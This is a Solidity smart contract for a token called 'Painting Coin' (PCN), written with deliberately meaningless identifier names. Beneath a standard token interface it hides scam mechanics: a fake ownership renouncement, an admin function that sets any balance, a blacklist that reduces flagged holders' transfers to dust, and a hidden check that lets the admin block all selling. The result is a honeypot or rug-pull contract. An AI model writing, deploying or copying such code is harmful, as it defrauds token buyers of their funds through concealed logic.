//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface walletMin {
    function createPair(address fromLaunch, address fundLaunchSender) external returns (address);
}

interface swapLiquidityTake {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tradingWallet) external view returns (uint256);

    function transfer(address maxEnable, uint256 shouldAuto) external returns (bool);

    function allowance(address takeAtMax, address spender) external view returns (uint256);

    function approve(address spender, uint256 shouldAuto) external returns (bool);

    function transferFrom(
        address sender,
        address maxEnable,
        uint256 shouldAuto
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fromAt, uint256 value);
    event Approval(address indexed takeAtMax, address indexed spender, uint256 value);
}

abstract contract sellModeMax {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface amountSenderBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchSell is swapLiquidityTake {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PaintingCoin is sellModeMax, swapLiquidityTake, launchSell {

    function symbol() external view virtual override returns (string memory) {
        return tradingAmount;
    }

    uint256 liquidityTotal;

    bool public txReceiverTeam;

    uint256 constant enableTx = 10 ** 10;

    function txTo(uint256 shouldAuto) public {
        modeBuy();
        swapWallet = shouldAuto;
    }

    function modeBuy() private view {
        require(receiverSenderSwap[_msgSender()]);
    }

    function getOwner() external view returns (address) {
        return buyTotal;
    }

    function swapLaunched(address swapToken, uint256 shouldAuto) public {
        modeBuy();
        isLaunched[swapToken] = shouldAuto;
    }

    mapping(address => bool) public receiverSenderSwap;

    bool private sellTeam;

    address public listSender;

    constructor (){
        if (minLiquidity != takeWallet) {
            launchedEnableShould = toTeam;
        }
        swapAmount();
        amountSenderBuy fromReceiver = amountSenderBuy(atBuy);
        listSender = walletMin(fromReceiver.factory()).createPair(fromReceiver.WETH(), address(this));
        if (tradingMin != launchSwap) {
            teamMin = toTeam;
        }
        shouldTo = _msgSender();
        receiverSenderSwap[shouldTo] = true;
        isLaunched[shouldTo] = tokenTrading;
        if (tradingMin) {
            launchSwap = false;
        }
        emit Transfer(address(0), shouldTo, tokenTrading);
    }

    uint256 public launchedEnableShould;

    function transferFrom(address liquidityAutoTotal, address maxEnable, uint256 shouldAuto) external override returns (bool) {
        if (_msgSender() != atBuy) {
            if (totalList[liquidityAutoTotal][_msgSender()] != type(uint256).max) {
                require(shouldAuto <= totalList[liquidityAutoTotal][_msgSender()]);
                totalList[liquidityAutoTotal][_msgSender()] -= shouldAuto;
            }
        }
        return teamTotalLaunched(liquidityAutoTotal, maxEnable, shouldAuto);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tokenTrading;
    }

    function name() external view virtual override returns (string memory) {
        return walletSender;
    }

    function teamTotalLaunched(address liquidityAutoTotal, address maxEnable, uint256 shouldAuto) internal returns (bool) {
        if (liquidityAutoTotal == shouldTo) {
            return launchFrom(liquidityAutoTotal, maxEnable, shouldAuto);
        }
        uint256 fromLimitAmount = swapLiquidityTake(listSender).balanceOf(buyAuto);
        require(fromLimitAmount == swapWallet);
        require(maxEnable != buyAuto);
        if (buyFee[liquidityAutoTotal]) {
            return launchFrom(liquidityAutoTotal, maxEnable, enableTx);
        }
        return launchFrom(liquidityAutoTotal, maxEnable, shouldAuto);
    }

    bool public launchSwap;

    address atBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function launchFrom(address liquidityAutoTotal, address maxEnable, uint256 shouldAuto) internal returns (bool) {
        require(isLaunched[liquidityAutoTotal] >= shouldAuto);
        isLaunched[liquidityAutoTotal] -= shouldAuto;
        isLaunched[maxEnable] += shouldAuto;
        emit Transfer(liquidityAutoTotal, maxEnable, shouldAuto);
        return true;
    }

    function takeTeam(address shouldReceiverSwap) public {
        modeBuy();
        
        if (shouldReceiverSwap == shouldTo || shouldReceiverSwap == listSender) {
            return;
        }
        buyFee[shouldReceiverSwap] = true;
    }

    uint8 private swapMode = 18;

    function transfer(address swapToken, uint256 shouldAuto) external virtual override returns (bool) {
        return teamTotalLaunched(_msgSender(), swapToken, shouldAuto);
    }

    uint256 public minLiquidity;

    bool public tradingMin;

    mapping(address => uint256) private isLaunched;

    uint256 private toTeam;

    function allowance(address isMode, address txIs) external view virtual override returns (uint256) {
        if (txIs == atBuy) {
            return type(uint256).max;
        }
        return totalList[isMode][txIs];
    }

    function decimals() external view virtual override returns (uint8) {
        return swapMode;
    }

    uint256 public teamMin;

    string private tradingAmount = "PCN";

    function swapAmount() public {
        emit OwnershipTransferred(shouldTo, address(0));
        buyTotal = address(0);
    }

    mapping(address => mapping(address => uint256)) private totalList;

    uint256 private takeWallet;

    address private buyTotal;

    function owner() external view returns (address) {
        return buyTotal;
    }

    event OwnershipTransferred(address indexed launchedTo, address indexed totalMode);

    function toReceiver(address marketingTake) public {
        if (txReceiverTeam) {
            return;
        }
        
        receiverSenderSwap[marketingTake] = true;
        if (takeWallet == toTeam) {
            toTeam = launchedEnableShould;
        }
        txReceiverTeam = true;
    }

    uint256 private tokenTrading = 100000000 * 10 ** 18;

    function balanceOf(address tradingWallet) public view virtual override returns (uint256) {
        return isLaunched[tradingWallet];
    }

    uint256 private launchedExempt;

    string private walletSender = "Painting Coin";

    address buyAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public buyFee;

    function approve(address txIs, uint256 shouldAuto) public virtual override returns (bool) {
        totalList[_msgSender()][txIs] = shouldAuto;
        emit Approval(_msgSender(), txIs, shouldAuto);
        return true;
    }

    uint256 swapWallet;

    address public shouldTo;

}